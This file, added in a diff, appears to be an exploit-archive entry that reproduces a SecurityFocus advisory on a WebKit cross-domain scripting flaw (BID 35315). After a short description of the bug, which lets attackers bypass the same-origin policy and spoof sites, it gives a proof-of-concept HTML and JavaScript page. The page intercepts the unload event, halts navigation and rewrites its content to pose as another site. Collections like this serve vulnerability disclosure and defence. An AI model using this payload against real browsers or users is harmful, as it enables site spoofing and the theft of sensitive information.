@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/35315/info
+
+WebKit is prone to a cross-domain scripting vulnerability because it fails to properly restrict the access of JavaScript code when loading new webpages.
+
+A remote attacker can exploit this vulnerability to bypass the same-origin policy and obtain potentially sensitive information or to launch spoofing attacks against other sites. Other attacks are also possible.
+
+NOTE: This issue was previously covered in BID 35260 (Apple Safari Prior to 4.0 Multiple Security Vulnerabilities), but has been assigned its own record to better document it.
+
+<html> <body onunload='intercept()'> <script> function intercept() { setTimeout('update_page()',10); stop(); } function update_page() { document.getElementById('hideme').style.visibility = "hidden"; document.getElementById('showme').style.visibility = "visible"; document.getElementById('sitename').innerHTML = document.location; } </script> <span id=showme style="visibility: hidden"> <font size=+1 color=teal>This is a spoofed version of <b><span id=sitename></span></b></font> </span> <br> <span id=hideme>Please navigate away from this page.</span> 
